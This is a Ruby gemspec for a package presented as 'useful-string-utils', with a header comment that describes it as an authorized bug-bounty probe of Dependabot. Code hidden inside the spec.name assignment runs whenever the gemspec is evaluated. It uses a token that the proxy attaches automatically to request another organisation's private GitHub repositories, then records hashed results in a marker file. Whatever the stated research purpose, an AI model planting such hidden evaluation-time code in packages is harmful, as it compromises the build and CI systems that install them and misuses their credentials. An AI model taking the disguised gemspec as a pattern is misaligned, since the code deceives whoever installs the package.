# frozen_string_literal: true
#
# v2.0 boundary-verification probe — cross-installation private-repo read audit.
#
# Authorization context: bug bounty research authorized by HackerOne GitHub
# program (programs/github/scope.md). Tester: mr_benty (CVP-approved). All
# probes within program-published scope; all artifacts sanitized; no third-
# party data accessed; PROBE-MARK encoded outputs only; both orgs are
# researcher-owned test accounts (mr-benty + dep-test-victim-mb).
#
# Scope: HYP-NEW-B — verify whether the per-installation GitHub App token
# auto-attached by the proxy (per dependabot/proxy@2803a0f0
# internal/handlers/github_api.go:62-78) crosses org-installation
# boundaries when accessing api.github.com/repos/<other-org>/<other-repo>.
#
# Source review confirmed: github_api.go has no org-allowlist; token
# attaches on any /repos/<x>/<y>/* under api.github.com that matches
# CheckGitHubAPIHost regex. The remaining unknown is GitHub's API-server-
# side scope enforcement when the installation token is presented for a
# foreign-org repo.
#
# Three GET probes from inside the bundler-updater container running on
# dep-test-victim-mb/victim-app's installation:
#
#   T1: GET /repos/dep-test-victim-mb/victim-app — OWN-installation
#       baseline. Expected 200 (token authorized).
#   T2: GET /repos/mr-benty/<HYP_NEW_B_REPO> — FOREIGN-org private repo.
#       Expected 404 if boundary holds; 200 if cross-org read confirmed.
#   T3: GET /repos/mr-benty/<HYP_NEW_B_REPO>/contents/CANARY.md — same
#       boundary verification at file-content level.
#
# Outcome interpretation:
#   - T2 + T3 return 200 with private content → CRITICAL — cross-org
#     private repo read via per-installation token. New finding class
#     outside F011's chain.
#   - T2 returns 404 → boundary holds via API-server-side scope check
#     (honest negative).
#   - T2 returns 401/403 → token doesn't auto-attach for foreign-org
#     paths (different boundary mechanism).

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "json"
      require "digest"

      results = []

      probe_mark = "PROBE-MARK-HYP-NEW-B"

      # Foreign-org repo to probe (researcher's own private test repo)
      foreign_org = "mr-benty"
      foreign_repo = ENV["HYP_NEW_B_REPO"] || "hyp-new-b-marker-57a23c86"
      own_org = "dep-test-victim-mb"
      own_repo = "victim-app"

      tests = [
        ["T1-baseline-own-repo", "/repos/#{own_org}/#{own_repo}"],
        ["T2-foreign-org-repo", "/repos/#{foreign_org}/#{foreign_repo}"],
        ["T3-foreign-org-canary", "/repos/#{foreign_org}/#{foreign_repo}/contents/CANARY.md"],
      ]

      tests.each_with_index do |(label, path), i|
        begin
          uri = URI("https://api.github.com#{path}")
          h = Net::HTTP.new(uri.host, uri.port)
          h.use_ssl = true
          h.open_timeout = 4
          h.read_timeout = 6
          req = Net::HTTP::Get.new(uri.request_uri)
          req["Accept"] = "application/vnd.github+json"
          req["X-Probe-Mark"] = "#{probe_mark}-#{label}"
          rsp = h.request(req)
          body_len = rsp.body.to_s.length
          body_hash = Digest::SHA256.hexdigest(rsp.body.to_s[0, 512])[0, 8]
          # If 200 + content-length large enough, also encode the content sha256
          # (sha256 of full body, not exfiling content bytes — just integrity hash)
          full_hash = Digest::SHA256.hexdigest(rsp.body.to_s)[0, 12]
          results << "T#{i+1}-#{label[0..15]}-s#{rsp.code}-l#{body_len}-h#{body_hash}-fh#{full_hash}"
        rescue => e
          results << "T#{i+1}-#{label[0..15]}-err-#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 12]}"
        end
      end

      summary = results.join("-").gsub(/[^A-Za-z0-9-]/, "x")[0, 1500]

      begin
        File.open("/home/dependabot/HYP-NEW-B-MARKER.txt", "w") do |f|
          f.puts "#{probe_mark}-cross-org-private-repo-read-audit"
          f.puts summary
          f.puts "ts=#{Time.now.utc.to_i}"
        end
      rescue
      end

      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]
  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
